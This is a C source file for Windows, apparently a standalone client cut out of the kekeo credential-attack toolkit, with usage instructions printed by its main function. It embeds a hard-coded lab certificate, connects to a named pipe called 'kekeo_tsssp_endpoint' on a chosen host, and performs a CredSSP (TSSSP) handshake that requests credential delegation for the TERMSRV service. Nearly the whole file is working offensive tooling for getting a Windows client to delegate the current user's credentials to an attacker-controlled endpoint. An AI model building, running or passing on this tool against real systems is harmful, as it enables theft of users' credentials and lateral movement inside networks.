#include "stdafx.h"
#include <windows.h>
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <Sspi.h>
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "User32.lib")

#define CLIENT_FLAGS	ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONFIDENTIALITY | ISC_REQ_DELEGATE | ISC_REQ_EXTENDED_ERROR | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_STREAM
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

const BYTE TSSSP_HC_CERTIFICATE[742] = { 0xe2, 0x02, 0x00, 0x00,
0x30, 0x82, 0x02, 0xde, 0x30, 0x82, 0x01, 0xc6, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02,	0x10, 0x58, 0x1b, 0x21, 0xa3, 0x99, 0xa8, 0xff, 0x87, 0x40, 0xf7, 0x7b, 0xb9, 0x2c, 0x00, 0x30, 0xd2, 0x30,
0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x18, 0x31, 0x16,	0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x0d, 0x73, 0x72, 0x76, 0x2e, 0x6c,
0x61, 0x62, 0x2e, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x30, 0x1e, 0x17, 0x0d, 0x31, 0x38, 0x30, 0x35, 0x31, 0x33, 0x32, 0x32, 0x33, 0x31, 0x32, 0x30, 0x5a, 0x17, 0x0d, 0x31, 0x38, 0x31, 0x31, 0x31,
0x32, 0x32, 0x32, 0x33, 0x31, 0x32, 0x30, 0x5a, 0x30, 0x18, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x0d, 0x73, 0x72, 0x76, 0x2e, 0x6c, 0x61, 0x62, 0x2e, 0x6c, 0x6f, 0x63,
0x61, 0x6c, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82,
0x01, 0x01, 0x00, 0xbc, 0x41, 0xa3, 0xfa, 0xea, 0xa3, 0xbc, 0x97, 0x16, 0xc4, 0xac, 0x5d, 0x01, 0x1e, 0xc7, 0xe5, 0x61, 0x4b, 0xe1, 0xcd, 0xc7, 0x5b, 0xa1, 0xd0, 0xb5, 0xec, 0x07, 0x9c, 0xc6,
0x22, 0x72, 0x1c, 0x24, 0xa6, 0xa8, 0x14, 0x73, 0xa1, 0xf2, 0x38, 0x76, 0x9c, 0x84, 0x99, 0xd8, 0xb0, 0x79, 0x48, 0x71, 0x49, 0x9a, 0x37, 0xeb, 0xf5, 0xe4, 0xf3, 0xed, 0xaf, 0x7c, 0x8b, 0xfd,
0x9d, 0xed, 0xa8, 0x27, 0xc5, 0x05, 0x7f, 0x14, 0x96, 0x01, 0xb8, 0x5d, 0xee, 0x06, 0x4f, 0x36, 0x91, 0xae, 0xcd, 0xdb, 0x1a, 0x67, 0x76, 0xfc, 0x8f, 0x66, 0x87, 0xb3, 0xe0, 0xa1, 0xe1, 0x52,
0x7e, 0xda, 0x4c, 0x97, 0x6d, 0x85, 0xa1, 0x53, 0xb5, 0xc8, 0x4e, 0xbd, 0x2a, 0xfd, 0xe8, 0x20, 0x17, 0x9f, 0x58, 0x78, 0x2d, 0x69, 0xf9, 0xcf, 0x07, 0xd2, 0xc4, 0xcd, 0xd8, 0x59, 0xcd, 0x2b,
0x00, 0xed, 0xb3, 0x6b, 0x50, 0xae, 0xac, 0x5a, 0x78, 0xd6, 0x3a, 0xe5, 0xb4, 0x22, 0x91, 0xec, 0x75, 0x3b, 0x1b, 0x88, 0xc7, 0x94, 0x0d, 0x22, 0x24, 0xca, 0x30, 0xac, 0x7c, 0xd9, 0x01, 0x0b,
0x97, 0x10, 0x4b, 0xb4, 0x07, 0x24, 0x0e, 0xcc, 0x8e, 0xda, 0xbc, 0x9a, 0x83, 0x05, 0x8c, 0xd5, 0xf9, 0xbe, 0x5c, 0x24, 0x21, 0xce, 0x36, 0x3f, 0xf8, 0x31, 0xfc, 0x34, 0x27, 0x0f, 0x33, 0xa2,
0xa8, 0x93, 0x57, 0x88, 0x43, 0xca, 0x9d, 0x1a, 0xfa, 0x50, 0xf8, 0x7c, 0x98, 0x0a, 0xdb, 0xf8, 0x9e, 0x28, 0xe2, 0xd4, 0x01, 0xfd, 0x85, 0xfa, 0x6a, 0x00, 0x76, 0x7a, 0x87, 0xf8, 0xee, 0x84,
0x27, 0xb8, 0x2f, 0x8d, 0x3b, 0x1b, 0x6b, 0x89, 0x56, 0xef, 0xc4, 0x2e, 0x02, 0xf2, 0xb7, 0x85, 0x90, 0x25, 0x56, 0x48, 0x94, 0xbb, 0x0b, 0xfc, 0x0e, 0xda, 0x4d, 0x43, 0xdc, 0x1a, 0xe1, 0x90,
0xb0, 0x51, 0x51, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x24, 0x30, 0x22, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03,
0x01, 0x30, 0x0b, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x04, 0x04, 0x03, 0x02, 0x04, 0x30, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x03, 0x82, 0x01,
0x01, 0x00, 0x81, 0x5c, 0x86, 0x0a, 0x02, 0xd0, 0xe0, 0x7c, 0x6e, 0x10, 0x43, 0x19, 0x1b, 0x55, 0xe3, 0xd8, 0x22, 0xf1, 0xf0, 0x71, 0x86, 0xfa, 0x89, 0xc1, 0xd6, 0x36, 0xf1, 0x50, 0x2c, 0x2d,
0x02, 0xbe, 0xc8, 0x49, 0x98, 0x14, 0xf3, 0xdf, 0xa7, 0xef, 0x7d, 0xd7, 0x8f, 0x04, 0xdd, 0x53, 0xec, 0x18, 0x12, 0x64, 0x55, 0x91, 0x5e, 0x99, 0xaf, 0x5d, 0xb0, 0xd2, 0xed, 0x25, 0xf6, 0x6e,
0x02, 0xa5, 0x6f, 0x52, 0x65, 0x92, 0x61, 0xbd, 0xb1, 0xc6, 0xc3, 0xdb, 0x8d, 0xa9, 0xf3, 0xf0, 0xf6, 0x80, 0x55, 0x72, 0x04, 0x7e, 0xcb, 0x71, 0x71, 0x7a, 0xcd, 0x8b, 0xc8, 0xb8, 0x84, 0x12,
0x60, 0x1a, 0xc1, 0x09, 0x65, 0x21, 0x0f, 0xe0, 0xe5, 0x19, 0x75, 0xc1, 0xa6, 0xd7, 0x8d, 0x75, 0x9d, 0x57, 0x58, 0xfd, 0x31, 0xad, 0xe1, 0xc8, 0xa8, 0x09, 0x83, 0x4a, 0x3f, 0xc0, 0xe9, 0x33,
0xc3, 0x0b, 0x17, 0x73, 0x2e, 0x88, 0x41, 0xd5, 0x94, 0x7c, 0x49, 0x13, 0xf2, 0x15, 0xac, 0x64, 0xe4, 0xba, 0x06, 0xdb, 0x4a, 0x83, 0x1e, 0x26, 0x92, 0xdf, 0xc5, 0x7d, 0xe3, 0xad, 0xea, 0x55,
0xcf, 0x92, 0xf9, 0xcb, 0xe0, 0x76, 0x25, 0xae, 0x77, 0xf0, 0x42, 0x0b, 0x85, 0xad, 0xa7, 0x2c, 0xcd, 0x73, 0x8d, 0x60, 0x46, 0x57, 0x0c, 0x84, 0x00, 0x3b, 0x1a, 0xad, 0x87, 0xb3, 0x96, 0x33,
0xcb, 0x58, 0x41, 0x62, 0x3b, 0x37, 0x9d, 0x23, 0x50, 0xf3, 0xae, 0x30, 0x93, 0x31, 0x6b, 0xd5, 0xef, 0x6c, 0xf7, 0x94, 0x88, 0xc7, 0x0b, 0xe1, 0x0b, 0x4f, 0x1a, 0x65, 0x03, 0x97, 0x33, 0xb2,
0xa3, 0xda, 0xf4, 0xfb, 0xcb, 0xfc, 0x75, 0xa7, 0x85, 0xe4, 0x4c, 0x39, 0x47, 0x03, 0x55, 0x1b, 0x84, 0x35, 0x8e, 0xde, 0x43, 0xa2, 0xef, 0x45, 0x89, 0x2c, 0xc6, 0xa2, 0x36, 0xda, 0x2f, 0xd7,
0x61, 0xe7,
};


BOOL kull_m_pipe_client(LPCWCHAR pipeName, PHANDLE phPipe)
{
	BOOL status = FALSE;
	DWORD dwMode = PIPE_READMODE_MESSAGE | PIPE_WAIT;
	if (WaitNamedPipe(pipeName, NMPWAIT_USE_DEFAULT_WAIT))
	{
		*phPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (*phPipe && (*phPipe != INVALID_HANDLE_VALUE))
		{
			if (!(status = SetNamedPipeHandleState(*phPipe, &dwMode, NULL, NULL)))
				printf("SetNamedPipeHandleState");
		}
		else printf("CreateFile");
	}
	else printf("WaitNamedPipe");
	return status;
}


BOOL kull_m_pipe_read(HANDLE hPipe, LPBYTE *buffer, DWORD *size)
{
	BOOL status = FALSE;
	DWORD szReaded, szBuffer = 0;
	BYTE * tmpBuffer = NULL; DWORD szTmpBuffer = 0;

	*size = 0;
	*buffer = NULL;
	do
	{
		if (*buffer)
		{
			tmpBuffer = *buffer;
			szTmpBuffer = szBuffer;
		}

		szBuffer += 2048;
		if (*buffer = (BYTE *)LocalAlloc(LPTR, szBuffer))
		{
			if (tmpBuffer)
			{
				RtlCopyMemory(*buffer, tmpBuffer, szTmpBuffer);
				tmpBuffer = (BYTE *)LocalFree(tmpBuffer);
			}

			if (status = ReadFile(hPipe, *buffer + szTmpBuffer, 2048, &szReaded, NULL))
			{
				*size = szTmpBuffer + szReaded;
				break;
			}
		}
	} while (GetLastError() == ERROR_MORE_DATA);

	if (!status)
	{
		printf("ReadFile");
		*buffer = (BYTE *)LocalFree(*buffer);
		*size = 0;
	}
	return status;
}


BOOL kull_m_pipe_write(HANDLE hPipe, LPCVOID buffer, DWORD size)
{
	BOOL status = FALSE;
	DWORD nbWritten;
	if (WriteFile(hPipe, buffer, size, &nbWritten, NULL) && (size == nbWritten))
	{
		if (!(status = FlushFileBuffers(hPipe)))
			printf("FlushFileBuffers");
	}
	else printf("WriteFile");
	return status;
}


BOOL kull_m_pipe_close(PHANDLE phPipe)
{
	BOOL status = FALSE;
	DWORD flags = 0;
	if (*phPipe && (*phPipe != INVALID_HANDLE_VALUE))
	{
		if (GetNamedPipeInfo(*phPipe, &flags, NULL, NULL, NULL) || (GetLastError() == ERROR_PIPE_NOT_CONNECTED))
		{
			if (flags & PIPE_SERVER_END)
			{
				if (!DisconnectNamedPipe(*phPipe))
					printf("DisconnectNamedPipe");
			}
			if (status = CloseHandle(*phPipe))
				*phPipe = INVALID_HANDLE_VALUE;
			else printf("CloseHandle");
		}
		else printf("GetNamedPipeInfo");
	}
	return status;
}


BOOL kuhl_m_tsssp_send_recv(HANDLE hPipe, PSecBuffer toSend, PSecBuffer toRecv)
{
	BOOL status = FALSE;
	if (kull_m_pipe_write(hPipe, toSend->pvBuffer, toSend->cbBuffer))
		status = kull_m_pipe_read(hPipe, (LPBYTE *)&toRecv->pvBuffer, &toRecv->cbBuffer);
	return status;
}


void kuhl_m_tsssp_freeBuffer(PSecBuffer buffer, BOOL isContext)
{
	if (buffer->pvBuffer)
	{
		if (isContext)
			FreeContextBuffer(buffer->pvBuffer);
		else
			LocalFree(buffer->pvBuffer);
		buffer->cbBuffer = 0;
		buffer->pvBuffer = NULL;
	}
}


NTSTATUS kuhl_m_tsssp_client(LPCWCHAR szPipeName, LPCWCHAR szClientTarget)
{
	HANDLE hPipe;
	SECURITY_STATUS initStatus, status;
	CredHandle hClientCred;
	CtxtHandle hClientCtx;
	SecBuffer SBClientIn[2] = { { 0, SECBUFFER_TOKEN, NULL },{ sizeof(TSSSP_HC_CERTIFICATE), SECBUFFER_READONLY | SECBUFFER_TOKEN, (PVOID)TSSSP_HC_CERTIFICATE } }, SBClientOut = { 0, SECBUFFER_TOKEN, NULL };
	SecBufferDesc SBDClientIn = { SECBUFFER_VERSION, 1 /**/, SBClientIn }, SBDClientOut = { SECBUFFER_VERSION, 1, &SBClientOut };
	ULONG ClientContextAttr;
	
	printf("AcquireCredentialsHandle: ");
	status = AcquireCredentialsHandle(NULL, L"TSSSP", SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hClientCred, NULL);
	if (status == SEC_E_OK)
	{
		printf("OK\n[pipe] Create client \'%ws\': ", szPipeName);
		if (kull_m_pipe_client(szPipeName, &hPipe))
		{
			printf("OK\nInitializeSecurityContext(0): ");
			initStatus = status = InitializeSecurityContext(&hClientCred, NULL, (SEC_WCHAR *)szClientTarget, CLIENT_FLAGS, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);
			SBDClientIn.cBuffers = 2;
			while (status == SEC_I_CONTINUE_NEEDED)
			{
				printf("OK\n");
				kuhl_m_tsssp_freeBuffer(&SBClientIn[0], FALSE);
				if (kuhl_m_tsssp_send_recv(hPipe, &SBClientOut, &SBClientIn[0]))
				{
					printf("InitializeSecurityContext(n): ");
					kuhl_m_tsssp_freeBuffer(&SBClientOut, TRUE);
					status = InitializeSecurityContext(&hClientCred, &hClientCtx, (SEC_WCHAR *)szClientTarget, CLIENT_FLAGS, 0, SECURITY_NATIVE_DREP, &SBDClientIn, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);
				}
				else break;
			}
			if (status == SEC_E_OK)
			{
				printf("OK (end)\n");
				kull_m_pipe_write(hPipe, SBClientOut.pvBuffer, SBClientOut.cbBuffer);
			}

			kuhl_m_tsssp_freeBuffer(&SBClientOut, TRUE);
			kuhl_m_tsssp_freeBuffer(&SBClientIn[0], FALSE);

			if ((status != SEC_E_OK) && (status != SEC_I_CONTINUE_NEEDED))
				printf("InitializeSecurityContext: 0x%08x\n", status);
			if (NT_SUCCESS(initStatus))
				DeleteSecurityContext(&hClientCtx);
			kull_m_pipe_close(&hPipe);
		}
		FreeCredentialHandle(&hClientCred);
	}
	else printf("AcquireCredentialsHandle: 0x%08x\n", status);
		
	return STATUS_SUCCESS;
}


int _tmain(int argc, _TCHAR* argv[])
{
	if (argc != 2)
	{
		printf("tsssp::client of kekeo\n");
		printf("Source:https://github.com/gentilkiwi/kekeo \n");
		printf("Usage:\n");
		printf("  %ws <target>\n", argv[0]);
		printf("Eg:\n");
		printf("  %ws localhost\n", argv[0]);
		printf("  %ws Computer01.test.com\n", argv[0]);
		return -1;
	}
	WCHAR target[MAX_PATH];
	wsprintf(target, L"TERMSRV/%ws", argv[1]);
	printf("[*]target:%ws\n", target);

	WCHAR pipe[MAX_PATH];
	wsprintf(pipe, L"\\\\%ws\\pipe\\kekeo_tsssp_endpoint", argv[1]);
	printf("[*]pipe:%ws\n", pipe);

	kuhl_m_tsssp_client(pipe, target);
	return 0;
}